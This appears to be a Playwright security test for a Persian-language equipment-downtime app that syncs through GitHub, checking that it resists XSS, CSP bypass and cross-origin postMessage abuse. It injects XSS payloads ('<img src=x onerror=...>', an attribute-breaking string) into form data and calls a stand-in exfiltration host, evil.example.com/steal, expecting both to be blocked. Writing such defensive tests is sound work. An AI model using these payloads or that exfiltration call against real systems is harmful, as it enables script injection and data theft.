// امنیت: کاربر محدود نمی‌تواند در سیستم مدیر کد اجرا کند (XSS)، CSP اطلاعات را فقط به GitHub می‌فرستد، پیام سایت‌های دیگر پذیرفته نمی‌شود
const {chromium}=require('playwright'); const http=require('http'), fs=require('fs'), path=require('path');
const {make}=require('./fakegh.js');
const ROOT=path.join(__dirname,'..','..'); const HTML=fs.readFileSync(path.join(__dirname,'..','out.html'));
let fails=0; const ok=(c,m)=>{ console.log((c?'  ok  ':'  FAIL ')+m); if(!c) fails++; };
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
(async()=>{
  const {S,srv}=make(); await new Promise(r=>srv.listen(0,r));
  const web=http.createServer((q,r)=>{ const m=/\/lib\/([\w.\-]+)$/.exec(q.url.split('?')[0]); if(m){ try{ r.writeHead(200,{'Content-Type':'text/javascript'}); r.end(fs.readFileSync(path.join(ROOT,'lib',m[1]))); }catch(e){ r.writeHead(404); r.end(); } return; }
    r.writeHead(200,{'Content-Type':'text/html; charset=utf-8'}); r.end(HTML); }); await new Promise(r=>web.listen(0,r));
  const evil=http.createServer((q,r)=>{ r.writeHead(200,{'Content-Type':'text/html'}); r.end('<html><body>evil</body></html>'); }); await new Promise(r=>evil.listen(0,r));
  const URL1=`http://localhost:${web.address().port}/nt/s.html`;
  const TT={deb:300,gap:500,maxWait:2000,tick:200,poll:1500,pollW:800,busy:1500,maxDefer:8000,refocus:0,retry:1000,squash:30,seen:60000,seenMin:300};
  const br=await chromium.launch({executablePath:process.env.CHROMIUM||undefined});
  async function ctx(url){ const c=await br.newContext({locale:'fa-IR',viewport:{width:420,height:860},acceptDownloads:true});
    await c.addInitScript(([api,T])=>{ window.NTSYNC_TEST={api,raw:api,T}; },[`http://localhost:${srv.address().port}`,TT]);
    const p=await c.newPage(); p.errs=[]; p.csp=[]; p.on('pageerror',e=>p.errs.push(String(e)));
    p.on('console',m=>{ if(/Content Security Policy/i.test(m.text())) p.csp.push(m.text().slice(0,160)); });
    await p.goto(url||URL1); await p.waitForFunction(()=>window.ntSync); p.ctx=c; return p; }
  const waitFor=async(fn,ms=15000)=>{ const t=Date.now(); while(Date.now()-t<ms){ try{ if(await fn()) return true; }catch(e){} await sleep(150); } return false; };
  const ls=(p,k)=>p.evaluate(k=>localStorage.getItem(k),k);
  const synced=async p=>{ const s=JSON.parse(await ls(p,'ntsync_state_v1')||'{}'); return s.sha===S.tags['nt-data'] && s.hash===await p.evaluate(()=>ntSync.hashOf(ntSync.outgoing(ntSync.collect(),ntSync.baseGet()||{}))); };
  const settle=async p=>{ await sleep(1000); await p.waitForFunction(()=>typeof ntBooted!=='undefined' && ntBooted,null,{timeout:20000}); await sleep(300); };
  const dlgText=p=>p.evaluate(()=>{ const d=document.getElementById('ntSyDlg'); return d.hidden?'':d.innerText; });
  const xss=p=>p.evaluate(()=>{ return window.__xss?1:0; });

  console.log('1) مدیر و کاربر محدود (استخراج)');
  const A=await ctx();
  await A.waitForFunction(()=>window.ntLocked===false); await A.click('#ntSyBtn'); if(await A.locator('#syOther').count()) await A.click('#syOther');
  await A.waitForSelector('#syTok'); await A.fill('#syTok',S.goodToken); await A.fill('#syP1','mine1405'); await A.fill('#syP2','mine1405'); await A.click('#syStartW');
  await waitFor(()=>!!S.tags['nt-data']); await settle(A);
  if(await dlgText(A)==='') await A.click('#ntSyBtn'); await A.click('#syUsers'); await A.click('#syUNew'); await A.fill('#syUName','استخراج'); await A.click('#syUSave'); await A.waitForSelector('#syLink');
  const link=await A.inputValue('#syLink'), pin=(await A.locator('#syPinOut').innerText()).replace(/\D/g,'');
  await A.click('#syBack'); await A.click('#syBack'); await A.click('#syClose'); await waitFor(()=>synced(A));
  const X=await ctx(link); await waitFor(async()=>(await dlgText(X)).includes('رمز ۶ رقمی')); await X.fill('#syPin',pin); await X.click('#syJoin'); await settle(X);

  console.log('2) کاربر محدود متن مخرب می‌فرستد');
  const P='<img src=x onerror="top.__xss=true">';   // بدون رقم (رقم‌ها در فرم‌ها فارسی می‌شوند)
  await X.evaluate(([P])=>{
    const p=new Intl.DateTimeFormat('en-u-ca-persian-nu-latn',{year:'numeric',month:'2-digit',day:'2-digit'}).formatToParts(new Date()); const g=t=>p.find(x=>x.type===t).value; const D=`${g('year')}/${g('month')}/${g('day')}`;
    const tv=JSON.parse(localStorage.getItem('nt_tavaqof_v1')||'{}'); const h=new Date().getHours(), sh=h>=6&&h<14?'صبح':(h>=14&&h<22?'عصر':'شب');
    tv[D+'|'+sh]={stops:[
      {id:'x1',dev:'لودر ZL50',from:'08:00',to:'09:00',cause:'خرابی موتور'+P,note:P,by:P},
      {id:'x2',dev:P,from:P,to:'',cause:P,note:'" onmouseover="top.__xss=true',by:''}],sent:false};
    localStorage.setItem('nt_tavaqof_v1',JSON.stringify(tv));
    const d=JSON.parse(localStorage.getItem('nt_daftar_v1')||'[]'); d.push({dev:'لودر ZL50',unit:P,val:15000,date:D},{dev:P,unit:'ساعت',val:1,date:P}); localStorage.setItem('nt_daftar_v1',JSON.stringify(d));
    ntSync.touch(['nt_tavaqof_v1','nt_daftar_v1']); },[P]);
  ok(await waitFor(()=>synced(X)),'فرستاده شد');
  await A.evaluate(()=>ntSync.sync({manual:true}));
  ok(await waitFor(async()=>((await ls(A,'nt_tavaqof_v1'))||'').includes('x2')),'به سیستم مدیر رسید');
  const tv=await ls(A,'nt_tavaqof_v1'), df=await ls(A,'nt_daftar_v1');
  ok(!tv.includes('<img') && !df.includes('<img') && tv.includes('‹img') && !/onerror=\\"/.test(tv),'در سیستم مدیر «<» «>» «"» بی‌خطر شد');

  console.log('3) مدیر همه جا را باز می‌کند');
  const names=await A.evaluate(()=>DOCS.map(d=>d.name));
  for(let i=0;i<names.length;i++){ await A.evaluate(i=>show(i),i); await sleep(500); }
  await A.evaluate(()=>{ try{ ntQr.home('ZL50'); }catch(e){} }); await sleep(300);
  await A.evaluate(()=>{ try{ document.getElementById('qrHist').click(); }catch(e){} }); await sleep(300);
  await A.evaluate(()=>{ document.getElementById('ntQrDlg').hidden=true; ntCharts.open(); }); await A.waitForFunction(()=>document.querySelectorAll('#ntChBody canvas').length>=1,null,{timeout:10000}).catch(()=>{});
  await A.evaluate(()=>ntCharts.close());
  await A.evaluate(()=>window.postMessage({nt:'report'},location.origin)); await A.waitForSelector('#ntRpDlg:not([hidden])');
  const [dl]=await Promise.all([A.waitForEvent('download',{timeout:15000}).catch(()=>null),A.click('#rpGo').catch(()=>{})]);
  ok(!!dl,'گزارش اکسل ساخته شد (کتابخانه از همان سایت با CSP)');
  await A.evaluate(()=>{ const b=document.getElementById('rpClose'); if(b) b.click(); });
  await A.evaluate(()=>{ window.print=()=>{}; ntQr.labels(); }); await A.click('#qrPrint'); await waitFor(()=>A.evaluate(()=>!!window.__ntQrLast));
  await sleep(500);
  ok(await xss(A)===0,'هیچ کد مخربی در سیستم مدیر اجرا نشد (۹ زبانه، صفحه دستگاه، سوابق، نمودار، گزارش)');

  console.log('4) CSP و پیام سایت دیگر');
  const blocked=await A.evaluate(async()=>{ try{ await fetch('https://evil.example.com/steal?x=1'); return false; }catch(e){ return true; } });
  ok(blocked,'فرستادن اطلاعات به سایت دیگر را مرورگر جلو می‌گیرد (CSP)');
  ok(await A.evaluate(async()=>{ try{ const r=await fetch(window.NTSYNC_TEST.api+'/repos/javad23195-lang/nt'); return r.ok; }catch(e){ return false; } }),'اتصال به GitHub (اینجا: GitHub ساختگی) کار می‌کند');
  await A.evaluate(()=>show(0)); const before=await A.evaluate(()=>active);
  const E=await A.ctx.newPage(); await E.goto(`http://127.0.0.1:${evil.address().port}/`);
  await E.evaluate(()=>{ window.addEventListener('message',()=>{}); });
  const popup=await Promise.all([A.ctx.waitForEvent('page'),E.evaluate(u=>{ window.__w=window.open(u); },URL1)]).then(x=>x[0]);
  await popup.waitForFunction(()=>typeof ntBooted!=='undefined' && ntBooted,null,{timeout:20000});
  const act0=await popup.evaluate(()=>active);
  await E.evaluate(()=>{ window.__w.postMessage({nt:'go',tab:'انبار'},'*'); window.__w.postMessage({nt:'report'},'*'); });
  await sleep(700);
  ok(await popup.evaluate(a=>active===a && document.getElementById('ntRpDlg')?document.getElementById('ntRpDlg').hidden:true,act0),'پیام سایت دیگر نادیده گرفته شد (زبانه عوض نشد، پنجره باز نشد)');
  await A.evaluate(()=>window.postMessage({nt:'go',tab:'انبار'},location.origin)); await sleep(300);
  ok(await A.evaluate(()=>DOCS[active].name==='انبار'),'پیام خود سامانه کار می‌کند');
  const cspN=A.csp.filter(t=>!t.includes('evil.example'));
  ok(cspN.length===0,'هیچ خطای CSP در کار عادی '+cspN.slice(0,3).join(' | '));
  ok(A.errs.length===0 && X.errs.length===0,'بدون خطای اسکریپت '+A.errs.concat(X.errs).join(' / '));
  console.log(fails?`\n${fails} مورد ناموفق`:'\nهمه موارد موفق');
  await br.close(); web.close(); evil.close(); srv.close(); process.exit(fails?1:0);
})().catch(e=>{ console.error('CRASH',e); process.exit(2); });
